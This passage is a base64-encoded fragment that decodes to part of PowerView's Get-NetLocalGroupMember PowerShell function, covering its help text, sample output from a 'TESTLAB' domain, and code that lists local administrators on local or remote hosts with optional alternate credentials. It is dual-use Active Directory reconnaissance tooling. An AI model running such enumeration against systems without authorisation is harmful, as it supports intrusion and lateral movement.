Wx0LCB0aGUgV2luMzIgQVBJIGNhbGwgTmV0TG9jYWxHcm91cEdldE1lbWJlcnMKd2lsbCBiZSB1c2VkIChmb3Igc3BlZWQpLiBTcGVjaWZ5aW5nICItTWV0aG9kIFdpbk5UIiBjYXVzZXMgdGhlIFdpbk5UIHNlcnZpY2UgcHJvdmlkZXIKdG8gYmUgdXNlZCBpbnN0ZWFkLCB3aGljaCByZXR1cm5zIGEgbGFyZ2VyIGFtb3VudCBvZiBpbmZvcm1hdGlvbi4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgdGhlIGhvc3RuYW1lIHRvIHF1ZXJ5IGZvciBzZXNzaW9ucyAoYWxzbyBhY2NlcHRzIElQIGFkZHJlc3NlcykuCkRlZmF1bHRzIHRvIHRoZSBsb2NhbGhvc3QuCgouUEFSQU1FVEVSIEdyb3VwTmFtZQoKVGhlIGxvY2FsIGdyb3VwIG5hbWUgdG8gcXVlcnkgZm9yIHVzZXJzLiBJZiBub3QgZ2l2ZW4sIGl0IGRlZmF1bHRzIHRvICJBZG1pbmlzdHJhdG9ycyIuCgouUEFSQU1FVEVSIE1ldGhvZAoKVGhlIGNvbGxlY3Rpb24gbWV0aG9kIHRvIHVzZSwgZGVmYXVsdHMgdG8gJ0FQSScsIGFsc28gYWNjZXB0cyAnV2luTlQnLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIGEgcmVtb3RlIG1hY2hpbmUuIE9ubHkgYXBwbGljYWJsZSB3aXRoICItTWV0aG9kIFdpbk5UIi4KCi5FWEFNUExFCgpHZXQtTmV0TG9jYWxHcm91cE1lbWJlciB8IGZ0CgpDb21wdXRlck5hbWUgICBHcm91cE5hbWUgICAgICBNZW1iZXJOYW1lICAgICBTSUQgICAgICAgICAgICAgICAgICAgSXNHcm91cCAgICAgICBJc0RvbWFpbgotLS0tLS0tLS0tLS0gICAtLS0tLS0tLS0gICAgICAtLS0tLS0tLS0tICAgICAtLS0gICAgICAgICAgICAgICAgICAgLS0tLS0tLSAgICAgICAtLS0tLS0tLQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBXSU5ET1dTMVxBZC4uLiBTLTEtNS0yMS0yNS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICBGYWxzZQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBXSU5ET1dTMVxsby4uLiBTLTEtNS0yMS0yNS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICBGYWxzZQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXERvbS4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICAgVHJ1ZSAgICAgICAgICAgVHJ1ZQpXSU5ET1dTMSAgICAgICBBZG1pbmlzdHJhdG9ycyBURVNUTEFCXGhhci4uLiBTLTEtNS0yMS04OS4uLiAgICAgICAgICBGYWxzZSAgICAgICAgICAgVHJ1ZQoKLkVYQU1QTEUKCkdldC1OZXRMb2NhbEdyb3VwTWVtYmVyIC1NZXRob2Qgd2lubnQgfCBmdAoKQ29tcHV0ZXJOYW1lICAgR3JvdXBOYW1lICAgICAgTWVtYmVyTmFtZSAgICAgU0lEICAgICAgICAgICAgICAgICAgIElzR3JvdXAgICAgICAgSXNEb21haW4KLS0tLS0tLS0tLS0tICAgLS0tLS0tLS0tICAgICAgLS0tLS0tLS0tLSAgICAgLS0tICAgICAgICAgICAgICAgICAgIC0tLS0tLS0gICAgICAgLS0tLS0tLS0KV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgV0lORE9XUzFcQWQuLi4gUy0xLTUtMjEtMjUuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgV0lORE9XUzFcbG8uLi4gUy0xLTUtMjEtMjUuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxEb20uLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgIFRydWUgICAgICAgICAgIFRydWUKV0lORE9XUzEgICAgICAgQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxoYXIuLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgIFRydWUKCi5FWEFNUExFCgpHZXQtTmV0TG9jYWxHcm91cCB8IEdldC1OZXRMb2NhbEdyb3VwTWVtYmVyIHwgZnQKCkNvbXB1dGVyTmFtZSAgIEdyb3VwTmFtZSAgICAgIE1lbWJlck5hbWUgICAgIFNJRCAgICAgICAgICAgICAgICAgICBJc0dyb3VwICAgICAgIElzRG9tYWluCi0tLS0tLS0tLS0tLSAgIC0tLS0tLS0tLSAgICAgIC0tLS0tLS0tLS0gICAgIC0tLSAgICAgICAgICAgICAgICAgICAtLS0tLS0tICAgICAgIC0tLS0tLS0tCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFdJTkRPV1MxXEFkLi4uIFMtMS01LTIxLTI1Li4uICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFdJTkRPV1MxXGxvLi4uIFMtMS01LTIxLTI1Li4uICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFRFU1RMQUJcRG9tLi4uIFMtMS01LTIxLTg5Li4uICAgICAgICAgICBUcnVlICAgICAgICAgICBUcnVlCldJTkRPV1MxICAgICAgIEFkbWluaXN0cmF0b3JzIFRFU1RMQUJcaGFyLi4uIFMtMS01LTIxLTg5Li4uICAgICAgICAgIEZhbHNlICAgICAgICAgICBUcnVlCldJTkRPV1MxICAgICAgIEd1ZXN0cyAgICAgICAgIFdJTkRPV1MxXEd1ZXN0IFMtMS01LTIxLTI1Li4uICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIElJU19JVVNSUyAgICAgIE5UIEFVVEhPUklULi4uIFMtMS01LTE3ICAgICAgICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIFVzZXJzICAgICAgICAgIE5UIEFVVEhPUklULi4uIFMtMS01LTQgICAgICAgICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIFVzZXJzICAgICAgICAgIE5UIEFVVEhPUklULi4uIFMtMS01LTExICAgICAgICAgICAgICAgIEZhbHNlICAgICAgICAgIEZhbHNlCldJTkRPV1MxICAgICAgIFVzZXJzICAgICAgICAgIFdJTkRPV1MxXGxvLi4uIFMtMS01LTIxLTI1Li4uICAgICAgICAgIEZhbHNlICAgICAgICBVTktOT1dOCldJTkRPV1MxICAgICAgIFVzZXJzICAgICAgICAgIFRFU1RMQUJcRG9tLi4uIFMtMS01LTIxLTg5Li4uICAgICAgICAgICBUcnVlICAgICAgICBVTktOT1dOCgouRVhBTVBMRQoKR2V0LU5ldExvY2FsR3JvdXBNZW1iZXIgLUNvbXB1dGVyTmFtZSBwcmltYXJ5LnRlc3RsYWIubG9jYWwgfCBmdAoKQ29tcHV0ZXJOYW1lICAgR3JvdXBOYW1lICAgICAgTWVtYmVyTmFtZSAgICAgU0lEICAgICAgICAgICAgICAgICAgIElzR3JvdXAgICAgICAgSXNEb21haW4KLS0tLS0tLS0tLS0tICAgLS0tLS0tLS0tICAgICAgLS0tLS0tLS0tLSAgICAgLS0tICAgICAgICAgICAgICAgICAgIC0tLS0tLS0gICAgICAgLS0tLS0tLS0KcHJpbWFyeS50ZXMuLi4gQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxBZG0uLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKcHJpbWFyeS50ZXMuLi4gQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxsb2MuLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgRmFsc2UgICAgICAgICAgRmFsc2UKcHJpbWFyeS50ZXMuLi4gQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxFbnQuLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgIFRydWUgICAgICAgICAgRmFsc2UKcHJpbWFyeS50ZXMuLi4gQWRtaW5pc3RyYXRvcnMgVEVTVExBQlxEb20uLi4gUy0xLTUtMjEtODkuLi4gICAgICAgICAgIFRydWUgICAgICAgICAgRmFsc2UKCi5PVVRQVVRTCgpQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5BUEkKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgZ3JvdXAgcHJvcGVydHkgZmllbGRzIGZyb20gQVBJIHJlc3VsdHMuCgpQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5XaW5OVAoKQ3VzdG9tIFBTT2JqZWN0IHdpdGggdHJhbnNsYXRlZCBncm91cCBwcm9wZXJ0eSBmaWVsZHMgZnJvbSBXaW5OVCByZXN1bHRzLgoKLkxJTksKCmh0dHA6Ly9zdGFja292ZXJmbG93LmNvbS9xdWVzdGlvbnMvMjEyODgyMjAvZ2V0LWFsbC1sb2NhbC1tZW1iZXJzLWFuZC1ncm91cHMtZGlzcGxheWVkLXRvZ2V0aGVyCmh0dHA6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS9hYTc3MjIxMShWUy44NSkuYXNweApodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9hYTM3MDYwMSh2PXZzLjg1KS5hc3B4CiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5BUEknKV0KICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuTG9jYWxHcm91cE1lbWJlci5XaW5OVCcpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICRFbnY6Q09NUFVURVJOQU1FLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cE5hbWUgPSAnQWRtaW5pc3RyYXRvcnMnLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FQSScsICdXaW5OVCcpXQogICAgICAgIFtBbGlhcygnQ29sbGVjdGlvbk1ldGhvZCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1ldGhvZCA9ICdBUEknLAoKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddIC1hbmQgKCRNZXRob2QgLWVxICdXaW5OVCcpKSB7CiAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtTmV0TG9jYWxHcm91cE1lbWJlcl0gLUNyZWRlbnRpYWwgaXMgb25seSBjb21wYXRpYmxlIHdpdGggJy1NZXRob2QgV2luTlQnIgogICAgICAgIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICBpZiAoJE1ldGhvZCAtZXEgJ0FQSScpIHsKICAgICAgICAgICAgICAgICMgaWYgd2UncmUgdXNpbmcgdGhlIE5ldGFwaTMyIE5ldExvY2FsR3JvdXBHZXRNZW1iZXJzIEFQSSBjYWxsIHRvIGdldCB0aGUgbG9jYWwgZ3JvdXAgaW5mb3JtYXRpb24KCiAgICAgICAgICAgICAgICAjIGFyZ3VtZW50cyBmb3IgTmV0TG9jYWxHcm91cEdldE1lbWJlcnMKICAgICAgICAgICAgICAgICRRdWVyeUxldmVsID0gMgogICAgICAgICAgICAgICAgJFB0ckluZm8gPSBbSW50UHRyXTo6WmVybwogICAgICAgICAgICAgICAgJEVudHJpZXNSZWFkID0gMAogICAgICAgICAgICAgICAgJFRvdGFsUmVhZCA9IDAKICAgICAgICAgICAgICAgICRSZXN1bWVIYW5kbGUgPSAwCgogICAgICAgICAgICAgICAgIyBnZXQgdGhlIGxvY2FsIHVzZXIgaW5mb3JtYXRpb24KICAgICAgICAgICAgICAgICRSZXN1bHQgPSAkTmV0YXBpMzI6Ok5ldExvY2FsR3JvdXBHZXRNZW1iZXJzKCRDb21wdXRlciwgJEdyb3VwTmFtZSwgJFF1ZXJ5TGV2ZWwsIFtyZWZdJFB0ckluZm8sIC0xLCBbcmVmXSRFbnRyaWVzUmVhZCwgW3JlZl0kVG90YWxSZWFkLCBbcmVmXSRSZXN1bWVIYW5kbGUpCgogICAgICAgICAgICAgICAgIyBsb2NhdGUgdGhlIG9mZnNldCBvZiB0aGUgaW5pdGlhbCBpbnRQdHIKICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkUHRySW5mby5Ub0ludDY0KCkKCiAgICAgICAgICAgICAgICAkTWVtYmVycyA9IEAoKQoKICAgICAgICAgICAgICAgICMgMCA9IHN1Y2Nlc3MKICAgICAgICAgICAgICAgIGlmICgoJFJlc3VsdCAtZXEgMCkgLWFuZCAoJE9mZnNldCAtZ3QgMCkpIHsKCiAgICAgICAgICAgICAgICAgICAgIyBXb3JrIG91dCBob3cgbXVjaCB0byBpbmNyZW1lbnQgdGhlIHBvaW50ZXIgYnkgZmluZGluZyBvdXQgdGhlIHNpemUgb2YgdGhlIHN0cnVjdHVyZQogICAgICAgICAgICAgICAgICAgICRJbmNyZW1lbnQgPSAkTE9DQUxHUk9VUF9NRU1CRVJTX0lORk9fMjo6R2V0U2l6ZSgpCgogICAgICAgICAgICAgICAgICAgICMgcGFyc2UgYWxsIHRoZSByZXN1bHQgc3RydWN0dXJlcwogICAgICAgICAgICAgICAgICAgIGZvciAoJGkgPSAwOyAoJGkgLWx0ICRFbnRyaWVzUmVhZCk7ICRpKyspIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyBjcmVhdGUgYSBuZXcgaW50IHB0ciBhdCB0aGUgZ2l2ZW4gb2Zmc2V0IGFuZCBjYXN0IHRoZSBwb2ludGVyIGFzIG91ciByZXN1bHQgc3RydWN0dXJlCiAgICAgICAgICAgICAgICAgICAgICAgICROZXdJbnRQdHIgPSBOZXctT2JqZWN0IFN5c3RlbS5JbnRwdHIgLUFyZ3VtZW50TGlzdCAkT2Zmc2V0CiAgICAgICAgICAgICAgICAgICAgICAgICRJbmZvID0gJE5ld0ludFB0ciAtYXMgJExPQ0FMR1JPVVBfTUVNQkVSU19JTkZPXzIKCiAgICAgICAgICAgICAgICAgICAgICAgICRPZmZzZXQgPSAkTmV3SW50UHRyLlRvSW50NjQoKQogICAgICAgICAgICAgICAgICAgICAgICAkT2Zmc2V0ICs9ICRJbmNyZW1lbnQKCiAgICAgICAgICAgICAgICAgICAgICAgICRTaWRTdHJpbmcgPSAnJwogICAgICAgICAgICAgICAgICAgICAgICAkUmVzdWx0MiA9ICRBZHZhcGkzMjo6Q29udmVydFNpZFRvU3RyaW5nU2lkKCRJbmZvLmxncm1pMl9zaWQsIFtyZWZdJFNpZFN0cmluZyk7JExhc3RFcnJvciA9IFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6R2V0TGFzdFdpbjMyRXJyb3IoKQoKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRSZXN1bHQyIC1lcSAwKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LU5ldExvY2FsR3JvdXBNZW1iZXJdIEVycm9yOiAkKChbQ29tcG9uZW50TW9kZWwuV2luMzJFeGNlcHRpb25dICRMYXN0RXJyb3IpLk1lc3NhZ2UpIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ01lbWJlck5hbWUnICRJbmZvLmxncm1pMl9kb21haW5hbmRuYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1NJRCcgJFNpZFN0cmluZwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJElzR3JvdXAgPSAkKCRJbmZvLmxncm1pMl9zaWR1c2FnZSAtZXEgJ1NpZFR5cGVHcm91cCcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLkFQSScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyArPSAkTWVtYmVyCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICMgZnJlZSB1cCB0aGUgcmVzdWx0IGJ1ZmZlcgogICAgICAgICAgICAgICAgICAgICROdWxsID0gJE5ldGFwaTMyOjpOZXRBcGlCdWZmZXJGcmVlKCRQdHJJbmZvKQoKICAgICAgICAgICAgICAgICAgICAjIHRyeSB0byBleHRyYWN0IG91dCB0aGUgbWFjaGluZSBTSUQgYnkgdXNpbmcgdGhlIC01MDAgYWNjb3VudCBhcyBhIHJlZmVyZW5jZQogICAgICAgICAgICAgICAgICAgICRNYWNoaW5lU2lkID0gJE1lbWJlcnMgfCBXaGVyZS1PYmplY3QgeyRfLlNJRCAtbWF0Y2ggJy4qLTUwMCcgLW9yICgkXy5TSUQgLW1hdGNoICcuKi01MDEnKX0gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmQgU0lECiAgICAgICAgICAgICAgICAgICAgaWYgKCRNYWNoaW5lU2lkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNYWNoaW5lU2lkID0gJE1hY2hpbmVTaWQuU3Vic3RyaW5nKDAsICRNYWNoaW5lU2lkLkxhc3RJbmRleE9mKCctJykpCgogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVycyB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkXy5TSUQgLW1hdGNoICRNYWNoaW5lU2lkKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRGYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJF8gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRUcnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXJzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRfLlNJRCAtbm90bWF0Y2ggJ1MtMS01LTIxJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzRG9tYWluJyAkRmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRfIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzRG9tYWluJyAnVU5LTk9XTicKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAkTWVtYmVycwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRMb2NhbEdyb3VwTWVtYmVyXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICMgb3RoZXJ3aXNlIHdlJ3JlIHVzaW5nIHRoZSBXaW5OVCBzZXJ2aWNlIHByb3ZpZGVyCiAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgIGlmICgkQ3JlZGVudGlhbCAtbmUgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSkgewogICAgICAgICAgICAgICAgICAgICAgICAkR3JvdXBQcm92aWRlciA9IE5ldy1PYmplY3QgRGlyZWN0b3J5U2VydmljZXMuRGlyZWN0b3J5RW50cnkoIldpbk5UOi8vJENvbXB1dGVyLyRHcm91cE5hbWUsZ3JvdXAiLCAkQ3JlZGVudGlhbC5Vc2VyTmFtZSwgJENyZWRlbnRpYWwuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHcm91cFByb3ZpZGVyID0gW0FEU0ldIldpbk5UOi8vJENvbXB1dGVyLyRHcm91cE5hbWUsZ3JvdXAiCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAkR3JvdXBQcm92aWRlci5wc2Jhc2UuSW52b2tlKCdNZW1iZXJzJykgfCBGb3JFYWNoLU9iamVjdCB7CgogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0NvbXB1dGVyTmFtZScgJENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR3JvdXBOYW1lJyAkR3JvdXBOYW1lCgogICAgICAgICAgICAgICAgICAgICAgICAkTG9jYWxVc2VyID0gKFtBRFNJXSRfKQogICAgICAgICAgICAgICAgICAgICAgICAkQWRzUGF0aCA9ICRMb2NhbFVzZXIuSW52b2tlR2V0KCdBZHNQYXRoJykuUmVwbGFjZSgnV2luTlQ6Ly8nLCAnJykKICAgICAgICAgICAgICAgICAgICAgICAgJElzR3JvdXAgPSAoJExvY2FsVXNlci5TY2hlbWFDbGFzc05hbWUgLWxpa2UgJ2dyb3VwJykKCiAgICAgICAgICAgICAgICAgICAgICAgIGlmKChbcmVnZXhdOjpNYXRjaGVzKCRBZHNQYXRoLCAnLycpKS5jb3VudCAtZXEgMSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBET01BSU5cdXNlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzRG9tYWluID0gJFRydWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgICROYW1lID0gJEFkc1BhdGguUmVwbGFjZSgnLycsICdcJykKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICMgRE9NQUlOXG1hY2hpbmVcdXNlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlcklzRG9tYWluID0gJEZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTmFtZSA9ICRBZHNQYXRoLlN1YnN0cmluZygkQWRzUGF0aC5JbmRleE9mKCcvJykrMSkuUmVwbGFjZSgnLycsICdcJykKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdBY2NvdW50TmFtZScgJE5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdTSUQnICgoTmV3LU9iamVjdCBTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLlNlY3VyaXR5SWRlbnRpZmllcigkTG9jYWxVc2VyLkludm9rZUdldCgnT2JqZWN0U0lEJyksMCkpLlZhbHVlKQogICAgICAgICAgICAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0lzR3JvdXAnICRJc0dyb3VwCiAgICAgICAgICAgICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNEb21haW4nICRNZW1iZXJJc0RvbWFpbgoKICAgICAgICAgICAgICAgICAgICAgICAgIyBpZiAoJE1lbWJlcklzRG9tYWluKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICMgdHJhbnNsYXRlIHRoZSBiaW5hcnkgc2lkIHRvIGEgc3RyaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU0lEJyAoKE5ldy1PYmplY3QgU3lzdGVtLlNlY3VyaXR5LlByaW5jaXBhbC5TZWN1cml0eUlkZW50aWZpZXIoJExvY2FsVXNlci5JbnZva2VHZXQoJ09iamVjdFNJRCcpLDApKS5WYWx1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEZXNjcmlwdGlvbicgJycKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdEaXNhYmxlZCcgJycKCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgIGlmICgkSXNHcm91cCkgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgJE1lbWJlciB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdMYXN0TG9naW4nICcnCiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgICAgICMgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICAjICAgICAgICAgICAgICRNZW1iZXIgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2luJyAkTG9jYWxVc2VyLkludm9rZUdldCgnTGFzdExvZ2luJykKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgIyAgICAgICAgICAgICAkTWVtYmVyIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0xhc3RM